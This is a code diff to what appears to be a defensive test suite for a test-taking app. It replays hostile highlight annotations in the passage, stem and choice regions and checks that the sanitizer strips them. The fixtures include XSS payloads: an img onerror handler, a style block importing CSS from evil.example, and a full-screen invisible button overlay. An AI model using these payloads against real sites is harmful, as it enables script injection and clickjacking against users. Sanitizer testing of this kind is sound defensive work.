@@ -130,9 +130,16 @@
        replays them in the real test UI — passage HTML through the resume
        sanitizer, note id/snippet/text through escaping. Plant them on the
        first question that HAS a passage (the only place they render). */
+    /* The annotation plant needs a question of its OWN. Module 0 questions 0
+       and 1 are already reserved by the per-question-time and rationale
+       probes, which audit the whole right pane; since highlighting now stores
+       stem and choice markup that replays INTO that pane, planting there would
+       make those probes count this plant's (correctly sanitized, legitimately
+       kept) <b> as injection. Pick the first passage question outside them. */
+    const RESERVED = { "0:0": 1, "0:1": 1 };
     let annQ = null, annMi = -1, annQi = -1;
     test.modules.forEach((m, mi) => m.questions.forEach((q, qi) => {
-      if(!annQ && q.passage){ annQ = q; annMi = mi; annQi = qi; }
+      if(!annQ && q.passage && !RESERVED[mi + ":" + qi]){ annQ = q; annMi = mi; annQi = qi; }
     }));
     /* The <style> element is in here deliberately: it carries its payload in
        TEXT, so no attribute filter can see it, and injected via innerHTML its
@@ -142,9 +149,17 @@
        it because STYLE was in none of their tag lists. */
     const STYLE_PAY = '<style>@import url("https://evil.example/beacon.css");' +
       '#rvBackBtn{position:fixed;inset:0;opacity:0;width:100vw;height:100vh;z-index:99999}</style>';
+    /* Highlighting covers the stem and individual choices as well as the
+       passage (2026-08-08), so each of those is a separate stored-markup slot
+       that Review Mode replays through innerHTML. Plant the same hostile
+       payload in every one — a sanitizer applied to the passage but forgotten
+       on the stem or a choice is exactly the gap this has to catch. */
+    const HOSTILE_HTML = PAYLOAD + '<img src=x onerror=window.__XSS_FIRED=true>' + STYLE_PAY +
+        '<span class="hl c-yellow" data-note-id="' + ATTR_PAY + '">kept highlight</span>';
     const hostileAnnotations = annQ ? { [test.modules[annMi].moduleId]: {
-      passageHtml: { [annQ.id]: PAYLOAD + '<img src=x onerror=window.__XSS_FIRED=true>' + STYLE_PAY +
-        '<span class="hl c-yellow" data-note-id="' + ATTR_PAY + '">kept highlight</span>' },
+      passageHtml: { [annQ.id]: HOSTILE_HTML },
+      stemHtml:    { [annQ.id]: HOSTILE_HTML },
+      choiceHtml:  { [annQ.id]: { 0: HOSTILE_HTML, 2: HOSTILE_HTML } },
       notes: { [annQ.id]: [{ id: ATTR_PAY, snippet: PAYLOAD, text: PAYLOAD }] }
     } } : undefined;
 
@@ -288,6 +303,27 @@
           : exec.length || handlers.length || urlAttrs.length
             ? `survived: ${exec.length} executable, ${handlers.length} handler(s), ${urlAttrs.length} url attr(s)`
             : "hostile markup defused, real highlight span survived the replay" });
+      /* the stem and each highlighted choice are their own innerHTML sites —
+         same sanitizer assertion, applied per region */
+      function regionSafe(label, el){
+        if(!el){ results.push({ surface: label, pass:false, note:"region not rendered" }); return; }
+        const rs = [...el.querySelectorAll("*")];
+        const ex = rs.filter(e => /^(SCRIPT|STYLE|NOSCRIPT|IFRAME|OBJECT|EMBED|IMG|LINK|FORM|INPUT|BUTTON|AUDIO|VIDEO)$/.test(e.tagName));
+        const hd = rs.filter(e => [...e.attributes].some(a => /^on/i.test(a.name)));
+        const ua = rs.filter(e => [...e.attributes].some(a => /^(src|href|xlink:href|srcdoc|action|formaction|data)$/i.test(a.name)));
+        results.push({ surface: label,
+          pass: !ex.length && !hd.length && !ua.length && !!el.querySelector("span.hl") && !window.__XSS_FIRED,
+          note: ex.length || hd.length || ua.length
+            ? `survived: ${ex.length} executable, ${hd.length} handler(s), ${ua.length} url attr(s)`
+            : "hostile markup defused, real highlight span survived" });
+      }
+      regionSafe("Review Mode replayed STEM annotations sanitized",
+        document.querySelector("#paneRight .q-text"));
+      regionSafe("Review Mode replayed CHOICE annotations sanitized",
+        document.querySelector('#paneRight .choice[data-idx="0"] .ctext'));
+      regionSafe("Review Mode replayed CHOICE annotations sanitized (2nd choice)",
+        document.querySelector('#paneRight .choice[data-idx="2"] .ctext'));
+
       const rail = $("notesCards");
       results.push(audit("Review Mode notes rail (hostile note id/snippet/text)", rail));
       const card = rail.querySelector(".note-card");
@@ -309,18 +345,33 @@
       const shapes = [
         { label: "notes[qid] is a string", notes: { [annQ.id]: "not-an-array" } },
         { label: "notes[qid] holds nulls", notes: { [annQ.id]: [null, 7] } },
-        { label: "passageHtml[qid] is an object", passageHtml: { [annQ.id]: { evil: 1 } } }
+        { label: "passageHtml[qid] is an object", passageHtml: { [annQ.id]: { evil: 1 } } },
+        { label: "stemHtml[qid] is an object", stemHtml: { [annQ.id]: { evil: 1 } } },
+        { label: "choiceHtml[qid] is a string", choiceHtml: { [annQ.id]: "nope" } },
+        { label: "choiceHtml[qid][idx] is an object", choiceHtml: { [annQ.id]: { 0: { evil: 1 } } } },
+        { label: "choiceHtml[qid] non-numeric index", choiceHtml: { [annQ.id]: { "x": "<b>y</b>" } } }
       ];
       const mid = test.modules[annMi].moduleId;
       const shapeBad = [];
       for(const s of shapes){
         /* the REAL restore function the app uses, not a copy */
-        const ms = { [mid]: { answers:{}, flags:new Set(), eliminated:{}, passageHtml:{}, notes:{} } };
+        const ms = { [mid]: { answers:{}, flags:new Set(), eliminated:{}, passageHtml:{}, stemHtml:{}, choiceHtml:{}, notes:{} } };
         try{
           window.AppSanitize.restoreAnnotations(ms,
             { [mid]: Object.assign({ passageHtml: {}, notes: {} }, s) });
           const notes = ms[mid].notes[annQ.id];
           const html = ms[mid].passageHtml[annQ.id];
+          const stemH = ms[mid].stemHtml[annQ.id];
+          const chH = ms[mid].choiceHtml[annQ.id];
+          if(stemH !== undefined && typeof stemH !== "string")
+            shapeBad.push(s.label + " -> non-string stemHtml survived");
+          if(chH !== undefined){
+            if(typeof chH !== "object" || Array.isArray(chH)) shapeBad.push(s.label + " -> bad choiceHtml container");
+            else Object.keys(chH).forEach(k => {
+              if(!/^\d+$/.test(k)) shapeBad.push(s.label + " -> non-numeric choice index survived");
+              if(typeof chH[k] !== "string") shapeBad.push(s.label + " -> non-string choice html survived");
+            });
+          }
           // whatever survives must be the exact shape the renderers assume
           if(notes !== undefined && (!Array.isArray(notes) ||
              notes.some(n => !n || typeof n.id !== "string" || typeof n.text !== "string"))){
